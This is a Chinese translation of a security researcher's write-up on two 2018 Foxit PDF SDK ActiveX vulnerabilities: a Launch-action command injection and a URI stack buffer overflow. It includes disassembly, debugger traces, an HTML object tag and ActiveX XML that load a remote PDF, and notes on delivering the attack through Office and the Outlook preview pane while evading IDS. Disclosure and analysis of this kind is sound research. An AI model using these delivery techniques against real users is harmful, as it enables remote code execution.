# Foxit Reader SDK ActiveX漏洞分析

阅读量 **264450**

|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)

发布时间 : 2019-02-13 15:30:20

 **x**

##### 译文声明

本文是翻译文章，文章原作者 srcincite，文章来源：srcincite.io

原文地址：<https://srcincite.io/blog/2019/02/01/activex-exploitation-in-2018-instantiation-is-not-scripting.html>

译文仅供参考，具体内容表达以及含义原文为准。

![](https://p4.ssl.qhimg.com/t01eb5b633ceabbf740.png)

## 一、前言

许多人看到这个标题后会提出一个问题：难道微软没有抛弃ActiveX？是的，微软几乎快完成这个壮举了。大多数安全从业人员都知道，ActiveX历史上存在各种缺陷，其中包含许多远程漏洞。微软自己也与许多第三方厂家披露过一些ActiveX漏洞。最后，微软发布了一个安全更新，从机制上禁止了ActiveX对象脚本在远程上下文中运行。

然而，微软的确留下了一个口子，使得ActiveX空间能够被实例化。在某种情况下，解析型漏洞可以利用这种机制实现远程代码执行。我认为微软之所以这么做可能是考虑到向后兼容问题，比如，Microsoft
Management Console（MMC）就需要实例化可信ActiveX控件，以便执行系统管理任务。

在本文中，我讨论了关于ActiveX的一些缓解措施，分析了为何这些缓解措施无法完全阻止所有攻击。随后，我讨论了[CVE-2018-19418](https://srcincite.io/advisories/src-2019-0009)的发现及利用过程，也讨论了[CVE-2018-19447](https://srcincite.io/advisories/src-2019-0010)的发现过程，后者是一个客户端漏洞，可以实现远程代码执行。漏洞利用过程中，受害者只需要打开恶意office文档即可，这是唯一的一个交互操作。

## 二、简介

在Foxit网站上有关于Foxit Reader SDK ActiveX的介绍，可以简单总结成如下一段话：

> PDF SDK
> ActiveX对产品经理及开发者而言是绝佳的解决方案，这是简单易用且可自定义的可视化组件，能够简单拖放到应用程序中，快速创建查看PDF的应用，整个过程无需具备任何PDF专业知识就能完成。

PDF SDK
ActiveX有两个版本：Standard（标准）版以及Professional（专业）版。这两个版本的区别在于专业版可以运行任意JavaScript代码，也能访问更多的PDF功能。大家不要把这些产品与Foxit
Reader自己的ActiveX控件混淆起来，后者可以在Foxit Reader中找到。

Foxit Reader的ActiveX控件路径为`C:\Program Files\Foxit Software\Foxit
Reader\plugins\FoxitReaderBrowserAx.dll`，该组件会将PDF解析任务交由正常的程序文件（即`C:\Program
Files\Foxit Software\Foxit
Reader\FoxitReader.exe`）进行处理。因此，如果程序代码中存在任何解析漏洞，我们也能DLL构建出漏洞利用路径。Adobe的产品也存在类似机制，唯一的区别在于Adobe产品会运行在沙箱环境中。

还有另外一个区别，Adobe并没有独立的ActiveX产品，因此不需要使用两种不同的解析器。有时候虽然厂商在核心产品中修复了bug，但忘记修复其他PDF解析器中的bug，Adobe能避免出现这种情况。

## 三、攻击目标

我测试的目标为`FoxitPDFSDKActiveX540_Std.msi`（`eba1a06230cc1a39ccb1fb7f04448a0d78859b60`）以及`FoxitPDFSDKActiveX540_Pro.msi`（`243a9099c9788dfcf38817f20208e5289b530f56`），当时都为最新版。

然而，在分析控件之前，我们需要确保能够正确初始化控件，不会弹出警告框。经过测试表明，这两款控件都可以安全进行初始化，没有设置kill
bit（ActiveX控件的兼容性标志）。

    
    
    Loaded File: C:\Program Files\Foxit Software\Foxit PDF SDK ActiveX Std\bin\FoxitPDFSDK_AX_Std.ocx
    Name:        FoxitPDFSDKStdLib
    Lib GUID:    {5FE9D64A-3BC2-43CB-AA47-F0B0C510EBEA}
    Version:     5.0
    Lib Classes: 7
    
    Class FoxitPDFSDK
    GUID: {0F6C092B-6E4C-4976-B386-27A9FD9E96A1}
    Number of Interfaces: 1
    Default Interface: _DFoxitPDFSDK
    RegKey Safe for Script: True
    RegKey Safe for Init: True
    KillBitSet: False
    

虽然这些设置可以让我们以脚本方式运行控件，但微软在最新的更新中禁用了这种操作（我不清楚这种防护机制具体的具体发布时间）。这种机制非常好，我审计过一些方法（如`OpenFileAsync`），也找到了能够轻松利用的栈缓冲区溢出漏洞，但我并没有向厂商反馈这些漏洞，因为在这种机制的防护下，我们找不到远程利用方式。

最初我想找到能够同时影响标准版和专业版的一个漏洞。由于这两款产品共享代码，因此找到这样一个目标对我来说并非难事。然而，前面提到过，标准版不支持JavaScript。如果后面我找到了内存损坏（memory
corruption）bug，由于我无法使用脚本，因此想找到利用方法可能难上加难。

## 四、漏洞分析

###  CVE-2018-19418：新窗口命令注入漏洞

由于这是我之前没研究过的PDF解析器，并且可以远程访问，因此我决定寻找是否存在简单一点的漏洞，比如逻辑漏洞。首先我决定交叉引用目标中对`CreateProcessW`的所有调用，结果的确找到了一些调用。

最有趣的调用位于`loc_104A0E80`处的`sub_1049FD60`：

    
    
    .text:10481D95 loc_10481D95:                                         ; CODE XREF: sub_10481D10+81
    .text:10481D95                 lea     ecx, [ebp+ProcessInformation]
    .text:10481D98                 push    ecx                           ; lpProcessInformation
    .text:10481D99                 lea     edx, [ebp+StartupInfo]
    .text:10481D9C                 push    edx                           ; lpStartupInfo
    .text:10481D9D                 push    0                             ; lpCurrentDirectory
    .text:10481D9F                 push    0                             ; lpEnvironment
    .text:10481DA1                 push    0                             ; dwCreationFlags
    .text:10481DA3                 push    0                             ; bInheritHandles
    .text:10481DA5                 push    0                             ; lpThreadAttributes
    .text:10481DA7                 push    0                             ; lpProcessAttributes
    .text:10481DA9                 push    eax
    .text:10481DAA                 lea     ecx, [ebp+var_10]
    .text:10481DAD                 call    sub_10163D59
    .text:10481DB2                 push    eax                           ; lpCommandLine
    .text:10481DB3                 push    0                             ; lpApplicationName
    .text:10481DB5                 call    ds:CreateProcessW             ; rce
    

当我们使用`/Launch`类型的`/OpenAction`来解析PDF文件时，就能进入该代码执行区域。此外，我还能将`/NewWindow`标志设置为`true`，绕过弹出警告。

    
    
    Breakpoint 0 hit
    eax=05de3fc4 ebx=05f58dc8 ecx=001dee6c edx=001dee18 esi=001dee94 edi=05b07f50
    eip=04ae1db5 esp=001dede8 ebp=001dee7c iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000246
    FoxitPDFSDK_AX_Std!IReader_ContentProvider::CreateContentProvider+0x7c5:
    04ae1db5 ff155403ce04    call    dword ptr [FoxitPDFSDK_AX_Std!DllCanUnloadNow+0x5da73 (04ce0354)] ds:0023:04ce0354={kernel32!CreateProcessW (75d5204d)}
    
    0:000> du poi(@esp+4)
    05de3fc4  "c:\Windows\System32\calc.exe"        <-- whatever we want
    
    0:000> kv
    ChildEBP RetAddr  Args to Child              
    WARNING: Stack unwind information not available. Following frames may be wrong.
    001dee7c 04ae2612 440f2825 05f58dc8 05ff3fd8 FoxitPDFSDK_AX_Std!IReader_ContentProvider::CreateContentProvider+0x7c5
    001deecc 04ae27e6 05f10fe8 05ff3fd8 05b07f50 FoxitPDFSDK_AX_Std!IReader_ContentProvider::CreateContentProvider+0x1022
    001deef8 04ae90be 05f58dc8 440f29c9 00000000 FoxitPDFSDK_AX_Std!IReader_ContentProvider::CreateContentProvider+0x11f6
    001def20 0466c70f 001def74 05dbbf80 440f297d FoxitPDFSDK_AX_Std!IReader_ContentProvider::CreateContentProvider+0x7ace
    001def94 046766f7 05d6cfd8 04f3d4c8 440f2925 FoxitPDFSDK_AX_Std!IReader_ContentProvider::GetDisplayStartDate+0x4caf
    001defcc 046b789a 06339fd4 001def9c 046958f3 FoxitPDFSDK_AX_Std!DllUnregisterServer+0x328e
    001df07c 046961f0 04ce7ea8 00000001 001df184 FoxitPDFSDK_AX_Std!IReader_ContentProvider::SetSource+0x2c106
    001df114 1005cf6a 00000001 0000000f 0fe4c2b4 FoxitPDFSDK_AX_Std!IReader_ContentProvider::SetSource+0xaa5c
    001df1e0 1004819a 0000000f 00000001 0000000b mfc140u+0x29cf6a
    001df208 100a4a52 0000000f 00000001 0000000b mfc140u+0x28819a
    001df230 00c83c87 001dfb64 0000000f 00000001 mfc140u+0x2e4a52
    001df2a0 1001e03d 00000110 00000000 001df2dc image00c80000+0x3c87
    001df2b0 7717c4b7 0009048a 00000110 0008047a mfc140u+0x25e03d
    001df2dc 77195825 1001e000 0009048a 00000110 USER32!gapfnScSendMessage+0x1cf
    001df358 771959c3 00000000 1001e000 0009048a USER32!CreateDialogParamW+0x225
    001df3a0 77195bb3 00000000 00000110 0008047a USER32!CreateDialogParamW+0x3c3
    001df3bc 7717c4b7 0009048a 00000110 0008047a USER32!DefDlgProcW+0x22
    001df3e8 7717c5b7 77195b91 0009048a 00000110 USER32!gapfnScSendMessage+0x1cf
    001df460 77171b01 00000000 77195b91 0009048a USER32!gapfnScSendMessage+0x2cf
    001df490 77171b27 77195b91 0009048a 00000110 USER32!PeekMessageA+0x18c
    

###  CVE-2018-19447：URI解析栈缓冲区溢出漏洞

当我在逆向分析逻辑问题时，我偶然发现了位于`loc_104CC981`处的`sub_104CC8B0`存在栈缓冲区溢出问题，当时我正尝试将用户提供的URI拷贝至`String1`缓冲区中：

    
    
    .text:104CC981 loc_104CC981:                                  ; CODE XREF: sub_104CC8B0+C3
    .text:104CC981                                                ; sub_104CC8B0+CA
    .text:104CC981                 push    offset word_106837E0   ; lpString2
    .text:104CC986                 lea     eax, [ebp+String1]
    .text:104CC98C                 push    eax                    ; lpString1
    .text:104CC98D                 call    ebx                    ; lstrcatW
    .text:104CC98F                 push    edi                    ; lpString2
    .text:104CC990                 lea     ecx, [ebp+String1]
    .text:104CC996                 push    ecx                    ; lpString1
    .text:104CC997                 call    ebx                    ; calls lstrcatW to trigger the stack overflow
    

该函数受栈cookie（stack
cookie，也称安全cookie）的保护，并且编译时启用了`/SAFESEH`选项，因此我们利用起来更难。即便如此，我们还是可以绕过这些保护措施，我们会在后续文章中介绍具体方法。

    
    
    STATUS_STACK_BUFFER_OVERRUN encountered
    (a50.1064): Break instruction exception - code 80000003 (first chance)
    eax=00000000 ebx=2da3944c ecx=75e9e4f4 edx=0031c085 esi=00000000 edi=238c2f50
    eip=75e9e371 esp=0031c2cc ebp=0031c348 iopl=0         nv up ei pl zr na pe nc
    cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200246
    kernel32!UnhandledExceptionFilter+0x5f:
    75e9e371 cc              int     3
    
    0:000> kv L10
     # ChildEBP RetAddr  Args to Child              
    00 0031c348 2d4cd47d 2da3944c 96120647 69edf9b8 kernel32!UnhandledExceptionFilter+0x5f (FPO: [Non-Fpo])
    WARNING: Stack unwind information not available. Following frames may be wrong.
    01 0031c67c 2d84ca09 00000044 00000000 00000000 FoxitPDFSDK_AX_Std!IReader_ContentProvider::GetDocEventHandler+0x12427
    02 0031caec 00410041 00410041 00410041 00410041 FoxitPDFSDK_AX_Std!IReader_ContentProvider::CreateContentProvider+0x4b419
    03 0031caf0 00410041 00410041 00410041 00410041 0x410041
    04 0031caf4 00410041 00410041 00410041 00410041 0x410041
    05 0031caf8 00410041 00410041 00410041 00410041 0x410041
    06 0031cafc 00410041 00410041 00410041 00410041 0x410041
    07 0031cb00 00410041 00410041 00410041 00410041 0x410041
    08 0031cb04 00410041 00410041 00410041 00410041 0x410041
    09 0031cb08 00410041 00410041 00410041 00410041 0x410041
    0a 0031cb0c 00410041 00410041 00410041 00410041 0x410041
    0b 0031cb10 00410041 00410041 00410041 00410041 0x410041
    0c 0031cb14 00410041 00410041 00410041 00410041 0x410041
    0d 0031cb18 00410041 00410041 00410041 00410041 0x410041
    0e 0031cb1c 00410041 00410041 00410041 00410041 0x410041
    0f 0031cb20 00410041 00410041 00410041 00410041 0x410041
    
    0:000> !exchain
    0031c338: kernel32!_except_handler4+0 (75eca332)
      CRT scope  0, filter: kernel32!UnhandledExceptionFilter+69 (75e9e37e)
                    func:   kernel32!UnhandledExceptionFilter+6d (75e9e382)
    0031cc44: 00410041
    Invalid exception stack at 00410041
    

但我们怎么才能触发这些漏洞呢？

## 五、攻击方法

由于我们不能执行任何脚本操作，因此我们不能使用像`OpenFile`之类的公开方法。然而进一步分析控件后，我们可以看到其中包含一个`FilePath`属性，我们可以设置这个属性。

![](https://p0.ssl.qhimg.com/t017b7f659813067743.png)

图1. ActiveX属性及方法

###  IE浏览器

因此如果我们使用远程托管的html文件，就可以在不执行脚本操作的情况下，通过ActiveX控件成功渲染pdf文件。

    
    
    <object classid='clsid:F53B7748-643C-4A78-8DBC-01A4855D1A10' id='target' />
       <param name="FilePath" value="http://172.16.175.1:9090/sample.pdf" />
    </object>
    
    
    
    saturn:~$ python -m SimpleHTTPServer 9090
    Serving HTTP on 0.0.0.0 port 9090 ...
    172.16.175.154 - - [21/Nov/2018 09:48:51] "GET / HTTP/1.1" 200 -    172.16.175.154 - - [21/Nov/2018 09:49:28] "GET /sample.pdf HTTP/1.1" 200 -    

这里的问题在于，如果目标站点不可信（这一点很有可能，除非目标站点位于Local Machine Zone中 ），我们就会看到如下一个非常不友好的弹出框：

![](https://p0.ssl.qhimg.com/t0113ac23ed846f967e.png)

图2. 弹框对攻击者来说始终不是件好事

点击“Allow”后，浏览器可以成功渲染我们构造的pdf文件：

![](https://p4.ssl.qhimg.com/t01b6b1ba204e413a25.png)

图3. 在浏览器中通过FoxitPDFSDKProCtrl.5渲染PDF文件

在点击“Allow”后，我们可以在“管理加载项”页面中看到攻击者的IP地址已位于站点白名单中，可以运行该控件。

![](https://p1.ssl.qhimg.com/t012bfa5fc1f7286d0d.png)

图4. 白名单站点可以运行Foxit.FoxitPDFSDKProCtrl.5控件

浏览器对我们来说的确是不错的攻击媒介，我们可以将攻击载荷托管在一个`iframe`中，给我们的受害者耍些花样。但这里的问题是我们还需要一次用户交互，并且最重要的一点：现在还有谁在用IE呢？

###  微软Office

因此我决定使用微软的Office产品，桌面环境中Office的使用范围比IE要广。此外，我们构造的攻击载荷基本上能适用于所有的Office文档，如Excel、Word、PowerPoint、Outlook预览面板等。Outlook预览面板是最理想的目标，因为用户不需要打开邮件，只需要预览邮件即可，这样我们就能实现100%可靠的代码执行效果。

Office与IE最关键的区别在于，Word中运行ActiveX控件时不会向用户弹出窗口。我在Windows 10
x86及x64系统上安装过打全补丁的Office 2013以及Office 2016，专门做了测试，能够确认这一点。

最开始时我构造了一个`poc.docx`文件，但在Word中设置`FilePath`属性时碰到了一些问题，当输入一个字符串并按下Enter键后，我看到了如下界面：

![](https://p3.ssl.qhimg.com/t01d8d94f280b571bd8.png)

图5. 无法设置`FilePath`属性，但微软给的信息非常明确

为了解决这个问题，我使用目标ActiveX构造了`poc.docx`文档，然后手动修改`word/activeX/activeX1.xml`，设置`FilePath`
[ocxPr](https://msdn.microsoft.com/en-us/library/ff532755\(v=office.12).aspx)属性，然后重新打包整个文档。

    
    
    <?xml version="1.0" encoding="UTF-8" standalone="no"?>
    <ax:ocx ax:classid="{0F6C092B-6E4C-4976-B386-27A9FD9E96A1}" ax:persistence="persistPropertyBag" xmlns:ax="http://schemas.microsoft.com/office/2006/activeX" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships">
        <ax:ocxPr ax:name="_Version" ax:value="327680"/>
        <ax:ocxPr ax:name="_ExtentX" ax:value="16775"/>
        <ax:ocxPr ax:name="_ExtentY" ax:value="12582"/>
        <ax:ocxPr ax:name="_StockProps" ax:value="0"/>
        <ax:ocxPr ax:name="FilePath" ax:value="http://172.16.175.1:9090/poc.pdf"/>
    

在这个基础上，我将`poc.docx`保存为`poc.rtf`文件。为了进一步增强rtf
poc效果，我使用了来自CVE-2018-8174的模板，将其中的`htmlfile`
`objClass`替换为`Foxit.FoxitPDFSDKStdCtrl.5` `objClass`。

最后生成的rtf poc文档看起来不错，并且文件大小更小，这样混淆起来更加方便，便于绕过IDS。

## 六、POC

我在PoC视频中演示了[CVE-2018-19418](https://srcincite.io/pocs/src-2019-0009.py.txt)以及[CVE-2018-19447](https://srcincite.io/pocs/src-2019-0010.py.txt)的利用过程，大家可访问[此处](https://vimeo.com/302125302)观看视频。

## 七、总结

结合本文内容，我通常会建议用户禁用ActiveX，不要打开不可信链接等等等。但实际上，当微软Office在实例化可信ActiveX控件时（这里的“可信”指的是能够安全初始化，安全处理脚本操作），用户看不到任何警告信息，用户甚至不知道他们安装的是包含第三方ActiveX控件的一款产品。

因此我想直接给开发者一些建议，请停止开发ActiveX控件，就这么简单。

## 八、参考资料

<https://www.blackhillsinfosec.com/having-fun-with-activex-controls-in-microsoft-word/>

本文翻译自srcincite.io [原文链接](https://srcincite.io/blog/2019/02/01/activex-exploitation-in-2018-instantiation-is-not-scripting.html)。如若转载请注明出处。

商务合作，文章发布请联系 anquanke@360.cn

本文由 **興趣使然的小胃** 原创发布

转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
[https://www.anquanke.com/post/id/170687](/post/id/170687)

安全客 - 有思想的安全新媒体

本文转载自: [srcincite.io](https://srcincite.io/blog/2019/02/01/activex-exploitation-in-2018-instantiation-is-not-scripting.html)

如若转载,请注明出处： <https://srcincite.io/blog/2019/02/01/activex-exploitation-in-2018-instantiation-is-not-scripting.html>

安全客 - 有思想的安全新媒体

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

  * [漏洞分析](/tag/漏洞分析)
  * [ActiveX](/tag/ActiveX)

 **+1** __1赞

 __收藏

![](https://p2.ssl.qhmsg.com/dm/200_200_100/t0104d1b8b4ca36e961.jpg) 興趣使然的小胃

分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)

